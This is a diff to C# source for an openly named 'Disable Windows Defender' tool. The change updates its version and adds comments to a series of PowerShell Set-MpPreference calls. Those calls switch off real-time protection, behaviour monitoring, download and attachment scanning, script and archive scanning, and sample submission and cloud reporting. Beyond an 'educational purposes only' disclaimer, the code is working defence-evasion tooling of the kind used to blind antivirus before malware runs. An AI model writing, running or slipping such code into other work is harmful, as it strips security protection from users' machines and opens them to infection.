@@ -5,7 +5,7 @@ using System.Security.Principal;
 using System.Threading;
 
 //       │ Author     : NYAN CAT
-//       │ Name       : Disable Windows Defender v0.3.5
+//       │ Name       : Disable Windows Defender v0.4
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only. 
@@ -26,16 +26,16 @@ namespace Disable_Windows_Defender
 
             Thread.Sleep(100);
 
-            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
-            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
+            RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
+            RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
             RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
-            RunPS("Set-MpPreference -DisableIOAVProtection $true");
-            RunPS("Set-MpPreference -DisablePrivacyMode $true");
-            RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
-            RunPS("Set-MpPreference -DisableArchiveScanning $true");
-            RunPS("Set-MpPreference -DisableScriptScanning $true");
-            RunPS("Set-MpPreference -SubmitSamplesConsent 0");
-            RunPS("Set-MpPreference -MAPSReporting 0");
+            RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
+            RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
+            RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
+            RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
+            RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
+            RunPS("Set-MpPreference -SubmitSamplesConsent Never"); //MAPSReporting 
+            RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
         }
 
         private static void RegistryEdit(string regPath, string name, string value)
